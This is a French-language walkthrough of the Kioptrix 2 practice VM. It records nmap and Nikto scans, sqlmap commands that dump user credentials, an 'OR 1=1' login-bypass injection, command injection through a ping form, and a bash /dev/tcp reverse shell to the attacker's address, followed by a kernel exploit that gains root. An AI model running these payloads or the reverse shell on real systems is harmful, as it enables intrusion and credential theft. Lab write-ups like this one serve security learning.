# Kioptrix_2
##### 1-reconnaissance
La première phase consiste à decouvrir l'adresse ip de notre machine.Étant donné que j'utilise un réseau privé sur un hôte Linux 
distant, j'ai choisi de vérifier les paramètres réseau sur le système Kali afin de déterminer l'adresse IP et le masque de sous-réseau 
du réseau privé. De plus, j’ai créé un répertoire ensiie 1 dans le répertoire personnel de root, sur le système Kali, pour capturer et stocker des fichiers.
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/eth0.png" width="860" height="220">
</p>
Avec l’adresse IP et le masque de sous-réseau du système Kali obtenus,je peux decouvrir l'adresse de ma machine qui est dans cette plage d'adresse:10.0.4.0/24
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/netdiscover.png" width="860" height="220">
</p>
Les paramètres utilisés pour Nmap effectueront une analyse sur les ports ouverts,les services qui s'éxécutent sur chaque port et leur versions,tout ces informations sont stockés dans un fichier scan.nmap
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/real_scan.png" width="860" height="480">
</p>
En examinant les résultats de l'analyse Nmap, les ports TCP 80 et 443 utilisent Apache Server version 2.0.52. De plus, le port TCP 22 utilise Open SSH version 3.9p1, le port TCP 631 utilise CUPS 1.1 et le port TCP 3306 utilise MySQL (version inconnue pour le moment).
##### 2-Scan de vulnérabilities
Pour examiner de plus près les ports TCP 80, j'ai lancé Nitko avec les paramètres d'hôte, de port et de fichier de sortie.
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/nikto.png" width="860" height="450">
</p>
il ne semble pas y avoir d’exploitation pour un shell distant.mais Nikto nous informe que la requete HTTP contient des spécifiques 
QUERY STRING.donc On va essayer avec SQLMAP pour trouver la base de donnée.
tout d'abord on intercepte la requête via burp suite.
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/burp_suite_3.png" width="860" height="220">
</p>
ensuite on récupère toutes les informations sur la requête et les enregistrés dans un fichier burp.txt.et enfin lancer sqlmap.**>sqlmap -r burp.txt --dbs**
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/database_name_5.png" width="860" height="100">
</p>
ensuite on récupère les tables du database webapp.**>sqlmap -r burp.txt -D webapp --tables**
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/table_name_6.png" width="860" height="120">
</p>
enfin récupèrer les comptes utilisateur.**>sqlmap -r burp.txt -D webapp -T users --dump**
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/get_users_7.png" width="860" height="170">
</p>
On a réussi à trouver deux comptes utilisateurs et leurs mots de pass.
##### 3-Exploitation
###### 3.1 SQL injection:
Une fois la collecte d’informations initiale terminée, j’ai décidé d’explorer le serveur Apache en me connectant au site Web via un navigateur Web.
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/page_accueil.png" width="860" height="170">
</p>
Une fois connecté au site Web, j'ai supposé que les informations de connexion étaient authentifiées sur une base de données MySQL. Cette hypothèse était basée sur le port 3306 découvrant le port initial de l'analyse Nmap. J'ai donc entré dans la commande **rajoul' OR 1=1 #** dans le champ Nom d'utilisateur et clicker le LOGIN button
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/sqli.png" width="860" height="170">
</p>
Succès! L'injection SQL a pu se connecter en tant que premier compte de la table.
Sur la base de la connexion réussie, une page d’utilitaire Ping s’est affichée.
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/pin_127001_8.png" width="860" height="170">
</p>
Alors,on va essayer de concatener la commande ping avec une autre commande ,afin de savoir si notre champs nous permet d'envoyer un reverse shell.
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/cat_etc_passwd_9.png" width="860" height="280">
</p>
Succès,on a réussi à lire le fichier /etc/passwd.donc on va essayer d'anvoyer un reverse shell vers ma machine avec la commande nc 
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/nc_reverse_shell_10.png" width="860" height="170">
</p>
je met mon interface en mode écoute pour un reverse shell,et rien n'est passé.Donc la commande netcat peut etre n'est pas installé,donc il faut essayer avec une autre méthode.**bash -i >& /dev/tcp/10.0.4.4/1234 0>&1** est une commande qui permet de nous envoyer un reverse shell.
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/get_reverse_shell_11.png" width="860" height="220">
</p>
comme avec l'utilitaire Ping, nous sommes connectés au compte apache,mais on n'a pas le droit de se connecter au shell.
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/bash_12.png" width="860" height="170">
</p>
###### 3.2 Escalation de privilèges
continuant avec le shell inversé, je devais rassembler des informations supplémentaires sur le système.
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/uname_13.png" width="860" height="130">
</p>
Génial! Maintenant que nous savons que le système d'exploitation était CentOS version 2.6.9–55.\\
Ensuite, j'ai examiné la base de données searchsploit installée sur le système Kali local pour déterminer s'il existait une vulnérabilité de CentOS de la version 2.6.9–55 du noyau.
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/metasploit.png" width="860" height="320">
</p>
alors on a trouvé un script en C qui exploite cette vulnérabilité de centos.alors je copie le script dans mon répertoire de travail pour l'éxécuter sur la machine cible.
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/copier.png" width="860" height="170">
</p>
je lance mon serveur sur mon espace de travail pour transmettre le fichier vers la machine cible
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/upload_exploit_14.png" width="860" height="220">
</p>
mon exploit est bien recu,donc je le compile avec gcc,aprés je l'éxécute.
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/get_root_15.png" width="860" height="170">
</p>
une immense satisfaction,j'ai réussi à gagné l'accés administrateur.donc je peux aller récupérer le **FLAG**.

une fois on a gagné l'accés administrateur,je peux supprimer mes traces, modifier dans le fichier **/etc/shadow** en ajoutant de nouveaux administrateurs,supprimer des comptes et aussi stopper l'éxécution des services....Donc, j'ai le pouvoir absolu de faire ce que je veux.
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/boom.gif" width="460" height="220">
</p>
support me on [twitter](https://twitter.com/rajoul6)














